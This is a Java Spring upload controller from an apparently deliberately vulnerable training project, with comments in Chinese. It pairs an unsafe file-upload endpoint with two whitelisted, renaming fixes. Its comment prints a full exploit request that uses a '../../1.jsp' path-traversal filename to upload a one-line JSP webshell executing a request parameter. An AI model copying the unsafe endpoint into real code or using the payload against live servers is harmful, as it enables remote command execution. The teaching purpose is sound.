package com.example.vulnerablecode.controller;

import java.io.File;
import java.io.IOException;
import java.util.UUID;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

@RestController
@RequestMapping("upload")
public class UploadController {

    /**
     * 存在任意文件上传漏洞，攻击者发送如下数据包上传文件，通过修改filename参数，即可上传JSP木马到任意目录
     *
        POST /upload/1 HTTP/1.1
        Host: 127.0.0.1:8080
        Content-Type: multipart/form-data; boundary=------------------------qazwsx
        Content-Length: 224

        --------------------------qazwsx
        Content-Disposition: form-data; name="file"; filename="../../1.jsp"
        Content-Type: text/plain

        <%Runtime.getRuntime().exec(request.getParameter("i"));%>
        --------------------------qazwsx--
     * @param file
     * @return
     * @throws IllegalStateException
     * @throws IOException
     */
    @GetMapping("1")
    public String upload(MultipartFile file) throws IllegalStateException, IOException {
        String fileName = file.getOriginalFilename();
        String filePath = "./upload/";
        File localFile = new File(filePath, fileName);
        file.transferTo(localFile);
        return localFile.getAbsolutePath();
    }

    /**
     * 修复任意文件上传漏洞，使用白名单对文件后缀名进行校验，重命名文件
     * @param file
     * @return
     * @throws IllegalStateException
     * @throws IOException
     */
    @GetMapping("safe")
    public String safeUpload(MultipartFile file) throws IllegalStateException, IOException {
        String fileName = file.getOriginalFilename();
        if (checkParameter(fileName)) {
            String suffix = fileName.substring(fileName.lastIndexOf("."));
            String filePath = "./upload/";
            File localFile = new File(filePath, UUID.randomUUID().toString() + suffix);
            file.transferTo(localFile);
            return localFile.getAbsolutePath();
        } else {
            return "参数不合法";
        }
    }

    /**
     * 修复任意文件上传漏洞，使用白名单对文件后缀名进行校验，创建临时文件
     * @param file
     * @return
     * @throws IOException
     */
    @GetMapping("safe2")
    public String safeUpload2(MultipartFile file) throws IOException {
        String fileName = file.getOriginalFilename();
        if (checkParameter(fileName)){
            String suffix = fileName.substring(fileName.lastIndexOf("."));
            File tempFile = File.createTempFile("tmp", suffix);
            tempFile.deleteOnExit();
            file.transferTo(tempFile);
            return tempFile.getAbsolutePath();
        } else {
            return "参数不合法";
        }
    }

    public static boolean checkParameter(String filename){
        String[] fileTypeWhiteList = {".xls", ".xlsx", ".csv"}; // 文件类型白名单
        for (String fileType : fileTypeWhiteList) {
            if (filename.endsWith(fileType) && !filename.contains("/") && !filename.contains("\\")) {
                return true;
            }
        }
        return false;
    }
}
